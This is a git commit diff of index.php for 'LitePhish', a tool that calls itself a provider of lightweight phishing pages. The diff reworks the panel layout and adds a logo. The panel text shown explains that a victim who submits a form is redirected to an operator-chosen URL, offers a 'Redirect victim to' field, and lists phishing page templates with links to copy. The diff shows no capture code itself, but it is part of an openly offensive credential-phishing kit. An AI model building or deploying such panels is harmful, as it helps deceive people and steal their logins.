420a48d301e5a1caa4f53a6223cb52e856226056
Gray Programmerz <hackrefisher@gmail.com>
2021-03-13 22:38:39 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,20 +1,20 @@
-<?php
-echo '
 <script src="modules/script.js"></script>
 <link rel="stylesheet" href="modules/style.css">
 <center>	
-<title>LitePhish</title>
-<a style="font-size:20px" href=>LitePhish - written from scratch</a><br>
-<p><a href=http://github.com/DarkSecDevelopers/LitePhish target=_blank>LitePhish</a> provides lite weight phishing pages with clean and minimal interface. <br>
-It is modified and lite version of <a href=http://www.github.com/graysuit/grayfish target=_blank>grayfish</a>.
+<title>LitePhish</title> 
+<img src=logo.png style=max-width:100%;width:250px;height:300px;><br>
+<!--
+<a style="font-size:20px" href=>LitePhish</a><br>
+-->
+<p style="font-size:20px;"><a href=http://github.com/DarkSecDevelopers/LitePhish target="_blank">LitePhish</a> provides lite weight phishing pages with clean and minimal interface. <br>
 When victim submit form, <br>he/she would be redirected towards the url you specified in input below.<br>
 When textarea is focused, it will automatically copies the link to clipboard.<br>
-You can also click on the page name to check the link.
-</p>
-<br><br>
+You can also click on the page name to check the link.</p>
+<br>
 <input oninput=UpdateRedirects(this.id) placeholder="Redirect victim to ? http://example.com" id="redirect">
-<br><br><br>';
+<br><br><br>
 
+<?php
 $Current_Url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on" ? "https://" : "http://").$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']); //https://stackoverflow.com/a/64450973/11390822
 $SiteIndex = 1;
 
@@ -28,6 +28,4 @@ foreach(scandir('./websites') as $file)
 		$SiteIndex += 1;
 	}
 }
-
-
 ?>
